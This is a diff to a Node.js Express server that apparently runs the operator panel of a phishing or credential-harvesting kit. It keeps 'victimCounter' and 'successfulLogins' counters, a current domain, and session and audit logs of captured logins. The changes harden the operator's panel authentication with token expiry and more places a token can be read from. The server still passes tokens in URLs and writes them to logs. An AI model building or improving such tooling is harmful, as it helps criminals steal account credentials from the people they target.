@@ -2,6 +2,7 @@
 const express = require('express');
 const cors    = require('cors');
 const crypto  = require('crypto');
+const fs      = require('fs');
 
 /* ----------  CONFIG  ---------- */
 const PANEL_USER     = process.env.PANEL_USER  || 'admin';
@@ -21,7 +22,7 @@ let victimCounter     = 0;
 let successfulLogins  = 0;
 let currentDomain     = '';
 
-// Token-based auth (token -> username)
+// Token-based auth (token -> {username, created})
 const authTokens = new Map();
 
 /* ----------  MIDDLEWARE  ---------- */
@@ -32,18 +33,26 @@ app.use(express.urlencoded({ extended: true }));
 
 /* ----------  AUTH HELPER  ---------- */
 function getAuthToken(req) {
-  // Check header first (for API calls), then query param (for page loads)
-  const header = req.headers['x-auth-token'];
+  // Check multiple sources: header, query param, body
+  const header = req.headers['x-auth-token'] || req.headers['authorization']?.replace('Bearer ', '');
   const query = req.query.token;
-  return header || query || null;
+  const body = req.body?.token;
+  return header || query || body || null;
 }
 
 function checkAuth(req, res, next) {
   const token = getAuthToken(req);
   if (token && authTokens.has(token)) {
-    req.isAuthed = true;
-    req.username = authTokens.get(token);
-    req.token = token;
+    const auth = authTokens.get(token);
+    // Check if token expired (24 hours)
+    if (Date.now() - auth.created > 24 * 60 * 60 * 1000) {
+      authTokens.delete(token);
+      req.isAuthed = false;
+    } else {
+      req.isAuthed = true;
+      req.username = auth.username;
+      req.token = token;
+    }
   } else {
     req.isAuthed = false;
   }
@@ -62,9 +71,10 @@ app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html')
 /* ----------  PANEL ROUTES  ---------- */
 app.get('/panel', checkAuth, (req, res) => {
   if (req.isAuthed) {
-    // Inject token into page for JS to use
-    let html = require('fs').readFileSync(__dirname + '/_panel.html', 'utf8');
-    html = html.replace('window.AUTH_TOKEN = null;', `window.AUTH_TOKEN = '${req.token}';`);
+    // Read and inject token
+    let html = fs.readFileSync(__dirname + '/_panel.html', 'utf8');
+    // Replace the placeholder with actual token
+    html = html.replace('const SERVER_TOKEN = null;', `const SERVER_TOKEN = '${req.token}';`);
     return res.send(html);
   }
   res.sendFile(__dirname + '/access.html');
@@ -76,9 +86,9 @@ app.post('/panel/login', (req, res) => {
   
   if (user === PANEL_USER && pw === PANEL_PASS) {
     const token = crypto.randomBytes(16).toString('hex');
-    authTokens.set(token, user);
-    console.log('Login success, redirecting with token:', token);
-    // Redirect with token in URL
+    authTokens.set(token, { username: user, created: Date.now() });
+    console.log('Login success, token:', token);
+    // Redirect with token
     return res.redirect('/panel?token=' + token);
   }
   
@@ -247,7 +257,7 @@ app.get('/api/panel', checkAuth, (req, res) => {
     success: successfulLogins,
     sessions: list,
     logs: auditLog.slice(-50).reverse(),
-    token: req.token // Return token so client can store it
+    token: req.token
   });
 });
 
